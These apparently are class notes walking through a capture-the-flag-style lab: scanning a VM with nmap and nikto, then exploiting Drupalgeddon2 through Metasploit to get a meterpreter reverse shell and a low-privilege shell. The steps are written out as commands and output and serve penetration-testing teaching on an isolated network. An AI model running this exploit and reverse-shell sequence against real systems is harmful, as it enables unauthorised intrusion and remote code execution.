# Billu Box

The devices which will hack is termed as box

## Why did we make all VM to NAT connection

Normally it is in bridged mode, i.e the VM are connected to your actual network, exploits can leak from the network to other actual computers as well, which could make issues

So we create NAT, it is somewhat "contained" more than bridged so it a lil bit safer (and also easy for the session as we only see VM stuff and not personal devices)

## step 0:

`sudo su`

cause we will use sudo stuff a lot here in kali side

## step 1: Foothold

We gather as much info as possible

we use nmap (network mapper) to find ip of the box to hack

1. do ifconfig to find your NAT IP
   Eg Output:

```
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.110.131  netmask 255.255.255.0  broadcast 192.168.110.255
        inet6 fe80::20c:29ff:fe74:24c3  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:74:24:c3  txqueuelen 1000  (Ethernet)
        RX packets 229  bytes 16344 (15.9 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 95  bytes 7707 (7.5 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 8  bytes 400 (400.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8  bytes 400 (400.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

So my IP is `192.168.110.131 `

2. `nmap -sP 192.168.110.1/24` -> ping hosts in the given subnet (i.e search from `192.168.110.1` to `192.168.110.255`)
    - Eg: `nmap -sP 192.168.110.147/24` scans from 192.168.110.147 to 255 hosts

Eg Output ->

```
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-14 09:02 EST
Nmap scan report for 192.168.110.1
Host is up (0.00070s latency).
MAC Address: 00:50:56:C0:00:08 (VMware)
Nmap scan report for 192.168.110.2
Host is up (0.00050s latency).
MAC Address: 00:50:56:EC:6B:0C (VMware)
Nmap scan report for 192.168.110.132
Host is up (0.00097s latency).
MAC Address: 00:0C:29:66:04:55 (VMware)
Nmap scan report for 192.168.110.254
Host is up (0.00053s latency).
MAC Address: 00:50:56:F8:38:E4 (VMware)
Nmap scan report for 192.168.110.131
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.84 seconds
```

so we have `192.168.110.1`, `192.168.110.2`, `192.168.110.132`, `192.168.110.254`, `192.168.110.131`

out of these mine is 192.168.110.131, so one of the remaining ip are the box

192.168.110.1, 192.168.110.2 these are the VM gateways so we can ignores them for now

so these two are possible target 192.168.110.132, 192.168.110.254

3. `nmap -sV 192.168.110.132 192.168.110.254` -> check if "service" is running it the given ports
    - scan all the services (application layer) port of the given ips

```
Nmap scan report for 192.168.110.132
Host is up (0.0010s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
111/tcp  open  rpcbind 2-4 (RPC #100000)
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
MAC Address: 00:0C:29:66:04:55 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 192.168.110.254
Host is up (0.00068s latency).
All 1000 scanned ports on 192.168.110.254 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)
MAC Address: 00:50:56:F8:38:E4 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 2 IP addresses (2 hosts up) scanned in 18.13 seconds
```

So maybe our box is `192.168.110.132`

it is the ubuntu machine, so we can confirm this ip is of BilluBox

OPTIONAL : `nmap -sV 192.168.110.1\24` will scan open ports of all the ip in the subnet

port 80 is running -> http -> website running -> type ip in browser to see the site

there is another port 8080 apache port -> see `192.168.110.132:8080` in browser

the default site is running -> generally this is removed

## Step 2: Vulnerability Analysis

we use `nikto` -> Vulnerability Analysis tool

1. `nikto -h http://192.168.110.132` -> add http as we need to pass the website

Eg:

```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.110.132
+ Target Hostname:    192.168.110.132
+ Target Port:        80
+ Start Time:         2021-12-14 09:46:10 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ Retrieved x-powered-by header: PHP/5.6.36-1+ubuntu14.04.1+deb.sury.org+1
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'x-generator' found, with contents: Drupal 8 (https://www.drupal.org)
+ Uncommon header 'x-drupal-dynamic-cache' found, with contents: MISS
+ Uncommon header 'x-drupal-cache' found, with contents: HIT
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Entry '/README.txt' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/filter/tips/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/search/' in robots.txt returned a non-forbidden or redirect HTTP code (302)
+ Entry '/user/register/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/user/password/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/user/login/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/index.php/filter/tips/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/index.php/search/' in robots.txt returned a non-forbidden or redirect HTTP code (302)
+ Entry '/index.php/user/password/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/index.php/user/register/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/index.php/user/login/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 40 entries which should be manually viewed.
+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, POST
+ OSVDB-3092: /web.config: ASP config file is accessible.
...
```

Important Stuffs

-   Apache 2.4.7 in Ubuntu
-   drupal 8 service
-   `./README.txt` present -> we can http://192.168.110.132/README.txt to access it
-   http://192.168.110.132/robot.txt -> understand the directory in the website (used by search indexer)
-   in robot.txt we find ./user/login

We can also find page info some info via (right click -> view page info) in browser

Drupal is a CMU (content management System) like WordPress (tool which helps in making website) (wordpress uses template and plugins to make we dev easier)

OPTIONAL -> we can use [DirBuster](https://www.kali.org/tools/dirbuster/) to find directories fo some websites (we found it through robot.txt)

2. google what `drupal` is
3. google `drupal 8 exploit` and explore
    - `cve detail` -> gives a score about the exploit
    - we find [this](https://www.acunetix.com/vulnerabilities/web/drupal-core-8-x-x-remote-code-execution-8-0-0-8-3-8/)

drupal 8 has an exploit -> [drupalgeddon](https://www.google.com/search?q=drupalggredon&oq=drupalggredon&aqs=edge..69i57j0i13l8.3083j0j4&sourceid=chrome&ie=UTF-8)

-   Explore [drupalgeddon](https://www.rapid7.com/blog/post/2018/04/27/drupalgeddon-vulnerability-what-is-it-are-you-impacted/)
    -   What does this do?
    -   why is it popular?
    -   how much destruction can it cause in a small company?

4. now search drupalgeddon in `exploit DB`

    - [link](https://www.exploit-db.com/exploits/44449)
    - this is verified so we can proceed with it

## What is Reverse Shell

[Read This](https://blog.finxter.com/python-one-line-reverse-shell/)

## What is Bind Shell

[Read This](https://medium.com/@PenTest_duck/bind-vs-reverse-vs-encrypted-shells-what-should-you-use-6ead1d947aa9)

## What is Payload

[Read This](https://www.techtarget.com/searchsecurity/definition/payload)

## Step 3: use exploit

1.  `msfconsole`

    -   explore about metasploit -> exploit, auxiliary, post, payloads, encoders, nops, evasion

2.  `search drupalgeddon'

    output:

    ```
    Matching Modules

    ================

    # Name Disclosure Date Rank Check Description

    ***

    0 exploit/unix/webapp/drupal_drupalgeddon2 2018-03-28 excellent Yes Drupal Drupalgeddon 2 Forms API Property Injection

    ```

3.  `use 0` or `use exploit/unix/webapp/drupal_drupalgeddon2`

    output:

    ```
    [*] No payload configured, defaulting to php/meterpreter/reverse_tcp

    ```

4.  `show info`

    ```
    Name: Drupal Drupalgeddon 2 Forms API Property Injection
        Module: exploit/unix/webapp/drupal_drupalgeddon2
      Platform: PHP, Unix, Linux
          Arch: php, cmd, x86, x64
    Privileged: No
        License: Metasploit Framework License (BSD)
          Rank: Excellent
      Disclosed: 2018-03-28

    Provided by:
      Jasper Mattsson
      a2u
      Nixawk
      FireFart
      wvu <wvu@metasploit.com>

    Available targets:
      Id  Name
      --  ----
      0   Automatic (PHP In-Memory)
      1   Automatic (PHP Dropper)
      2   Automatic (Unix In-Memory)
      3   Automatic (Linux Dropper)
      4   Drupal 7.x (PHP In-Memory)
      5   Drupal 7.x (PHP Dropper)
      6   Drupal 7.x (Unix In-Memory)
      7   Drupal 7.x (Linux Dropper)
      8   Drupal 8.x (PHP In-Memory)
      9   Drupal 8.x (PHP Dropper)
      10  Drupal 8.x (Unix In-Memory)
      11  Drupal 8.x (Linux Dropper)

    Check supported:
      Yes

    Basic options:
      Name         Current Setting  Required  Description
      ----         ---------------  --------  -----------
      DUMP_OUTPUT  false            no        Dump payload command output
      PHP_FUNC     passthru         yes       PHP function to execute
      Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
      RHOSTS                        yes       The target host(s), see https://github.com/rapid7/metasploit-framework/w
                                              iki/Using-Metasploit
      RPORT        80               yes       The target port (TCP)
      SSL          false            no        Negotiate SSL/TLS for outgoing connections
      TARGETURI    /                yes       Path to Drupal install
      VHOST                         no        HTTP server virtual host

    Payload information:
      Avoid: 3 characters

    Description:
      This module exploits a Drupal property injection in the Forms API.
      Drupal 6.x, < 7.58, 8.2.x, < 8.3.9, < 8.4.6, and < 8.5.1 are
      vulnerable.

    References:
      https://nvd.nist.gov/vuln/detail/CVE-2018-7600
      https://www.drupal.org/sa-core-2018-002
      https://greysec.net/showthread.php?tid=2912
      https://research.checkpoint.com/uncovering-drupalgeddon-2/
      https://github.com/a2u/CVE-2018-7600
      https://github.com/nixawk/labs/issues/19
      https://github.com/FireFart/CVE-2018-7600

    Also known as:
      SA-CORE-2018-002
      Drupalgeddon 2

    ```

5.  `show options`

    ```
    Module options (exploit/unix/webapp/drupal_drupalgeddon2):

      Name         Current Setting  Required  Description
      ----         ---------------  --------  -----------
      DUMP_OUTPUT  false            no        Dump payload command output
      PHP_FUNC     passthru         yes       PHP function to execute
      Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
      RHOSTS                        yes       The target host(s), see https://github.com/rapid7/metasploit-framework/
                                              wiki/Using-Metasploit
      RPORT        80               yes       The target port (TCP)
      SSL          false            no        Negotiate SSL/TLS for outgoing connections
      TARGETURI    /                yes       Path to Drupal install
      VHOST                         no        HTTP server virtual host


    Payload options (php/meterpreter/reverse_tcp):

      Name   Current Setting  Required  Description
      ----   ---------------  --------  -----------
      LHOST  192.168.110.131  yes       The listen address (an interface may be specified)
      LPORT  4444             yes       The listen port


    Exploit target:

      Id  Name
      --  ----
      0   Automatic (PHP In-Memory)
    ```

we need to set RHOSTS for using the exploit (which is `192.168.110.132`)

RPORT -> the port (is 80 , no need to change)

SSL -> no as http not https

VHOST -> not required

-   eg: www.google.com has ip 222.222.222.222 -> rhost is 22.222.222.222, vhost is www.google.com

TARGETURI -> is / so no need to

6. `set RHOSTS 192.168.110.132`

7. OPTIONAL : `set LHOSTS 192.168.110.131` (auto set)

    - dont set port below 1000 as they are conserved
    - LHOST -> listening port

8. `exploit`

-   if everything is ok a meterpreter session should start, now you are inside the billu box

9. go to shell : `shell`

now you are inside the computer

10. `whoami`

output: `www-data` -> we are in thr LLP

11. go to `/temp`

12. `/bin/sh -i`

now you get $ sign showing user

You are successfully in LLP of the computer
